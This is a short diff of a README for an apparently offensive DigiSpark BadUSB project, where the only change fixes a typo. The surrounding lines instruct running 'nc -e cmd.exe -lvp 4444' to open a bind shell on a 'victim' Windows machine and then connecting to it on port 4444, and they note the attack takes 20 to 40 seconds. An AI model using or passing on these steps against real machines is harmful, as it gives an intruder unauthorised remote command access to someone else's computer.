@@ -21,7 +21,7 @@ Coppy the code into Arduino IDE and then upload it to DigiSpark.
 -And then run an instance of Netcat with parameters: "nc -e cmd.exe -lvp 4444";
 
 
--Now you're free to connect to tve victim Windows machine via port 4444(or whatever port u choose)
+-Now you're free to connect to the victim Windows machine via port 4444(or whatever port u choose)
 
 
 #The execution time for this attack is somewere in between 20 to 40 seconds(so pretty much a lot of time).
